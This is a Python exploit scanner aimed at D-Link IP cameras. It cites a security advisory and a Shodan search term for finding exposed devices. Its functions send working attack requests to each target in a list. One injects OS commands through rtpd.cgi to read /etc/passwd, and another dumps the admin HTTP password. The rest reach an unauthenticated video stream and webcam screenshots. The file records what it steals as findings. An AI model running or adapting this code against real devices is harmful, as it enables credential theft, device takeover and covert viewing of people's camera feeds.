"""
https://www.coresecurity.com/advisories/d-link-ip-cameras-multiple-vulnerabilities
shodan dorks: dcs-lig-httpd

OS Command Injection:
path = /cgi-bin/rtpd.cgi?echo&AdminPasswd_ss|tdb&get&HTTPAccount
http://192.168.1.100/cgi-bin/rtpd.cgi?uname&-a;cat&/etc/passwd

We_screen
http://192.168.1.100/md/lums.cgi

Authentication Bypass -> streaming
http://192.168.1.100/upnp/asf-mp4.asf
"""

import requests
import logging
import httplib2

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m' # red
G = '\033[32m' # green


class Dlink_multiple():

    def __init__(self, target_list):
        self.target_list = target_list
        self.findings = []

    def check_host(self, target, port):
        """
        Send testing request to server to check if it responds with a 200 to any requests
        :param target: string
        :param port: string
        :return: boolean
        """
        url = target+':'+port
        test_strings = ['/sjf_hdid','/s_a?jghjf/','/']
        response = 0
        errors = 0
        for test in test_strings:
            try:
                conn = httplib2.Http(disable_ssl_certificate_validation=True)
                if port == '443':
                    try:
                        resp, content = conn.request('https://' + url + test, 'GET')
                        if resp['status'] == '200':
                            response += 1
                    except:
                        pass
                else:
                    resp, content = conn.request('http://' + url + test, 'HEAD')

                if resp['status'] == '200':
                    response += 1

            except ConnectionError as e:
                errors += 1
                logging.debug('Error: '+str(e))

        if errors == 3:
            logging.debug(R+'Error limit reached for host %s:%s' %(target,port)+W)
            return False

        elif response == 3:
            logging.warning(R+'Ambiguous response from web server on %s:%s. All URIs return status 200' %(target, port)+W)
            return False

        return True


    def run(self):
        for target in self.target_list:
            ip = target.split(':')[0]
            port = target.split(':')[1]
            logging.info('Testing: %s:%s' % (ip, port))
            if self.check_host(ip, port):
                try:
                    self.os_command_Injection(ip, port)
                    self.web_credetntials(ip, port)
                    self.auth_bypass(ip, port)
                    self.web_screen(ip, port)
                except Exception:
                    pass
        return self.findings

    def os_command_Injection(self, ip, port):
        try:
            req = requests.get('http://%s:%s/cgi-bin/rtpd.cgi?uname&-a;cat&/etc/passwd' % (ip, port))
            logging.debug('URL: ' + str(req.url))
            logging.debug('Head: ' + str(req.headers))
            res = req.text
            logging.debug('RES: ' + res)
            if 'Usage' in res:
                logging.info(G + 'Target %s:%s is vulnerable to OS Command Injection!' % (ip, port) + W)
                uname = '$ uname -a : ' + str(res.split('\n')[1])
                logging.info(G+uname+W)
                passwd = '$ cat /etc/passwd : ' + str(res.split('\n')[2])
                logging.info(G+passwd+W)
                finding = ip+';'+port+';'+'HTTP'+';'+'OS Command Injection'+';'+'Dlink'+';'+'Credentials'+uname+' '+passwd
                self.findings.append(finding)
        except Exception as e:
            logging.warning('Error with host: %s:%s Details: %s'%(ip,port,str(e)))


    def web_credetntials(self, ip,port):
        try:
            req = requests.get('http://%s:%s/cgi-bin/rtpd.cgi?echo&AdminPasswd_ss|tdb&get&HTTPAccount' % (ip, port))
            logging.debug('URL: ' + str(req.url))
            logging.debug('Head: ' + str(req.headers))
            res = req.text
            logging.debug('RES: ' + res)
            if 'Usage' in res:
                credentials = str(res.split('\n')[1])
                logging.info(G + 'Target %s:%s is vulnerable to Web Credential Theft! \nCredentials: %s' % (ip, port, credentials) + W)
                finding = ip + ';' + port + ';' + 'HTTP' + ';' + 'Credentials Disclosure' + ';' +'Dlink'+';'+ 'Credentials: '+credentials
                self.findings.append(finding)
        except Exception as e:
            logging.warning('Error with host: %s:%s Details: %s' % (ip, port, str(e)))


    def auth_bypass(self, ip,port):
        try:
            req = requests.get('http://%s:%s/upnp/asf-mp4.asf' % (ip, port))
            logging.debug('URL: ' + str(req.url))
            logging.debug('Head: ' + str(req.headers))
            res = req.text
            logging.debug('RES: ' + res)
            if str(req.status_code) == '200':
                logging.info(G + 'Target %s:%s is vulnerable to Authentication Bypass!' % (ip, port) + W)
                finding = ip + ';' + port + ';' + 'HTTP' + ';' + 'Video Stream Disclosure' + ';' +'Dlink'+';'+ 'URL: ' + str(req.url)
                self.findings.append(finding)
        except Exception as e:
            logging.warning('Error with host: %s:%s Details: %s' % (ip, port, str(e)))


    def web_screen(self, ip,port):
        try:
            req = requests.get('http://%s:%s/md/lums.cgi' % (ip, port))
            logging.debug('URL: ' + str(req.url))
            logging.debug('Head: ' + str(req.headers))
            res = req.text
            logging.debug('RES: ' + res)
            if str(req.status_code) == '200':
                logging.info(G + 'Target %s:%s is vulnerable to Webcam screenshots Theft!' % (ip, port) + W)
                logging.debug(str(res))
                finding = ip + ';' + port + ';' + 'HTTP' + ';' + 'Snapshoot Disclosure' + ';' +'Dlink'+';'+ 'URL: ' + str(
                    req.url)
                self.findings.append(finding)
        except Exception as e:
            logging.warning('Error with host: %s:%s Details: %s' % (ip, port, str(e)))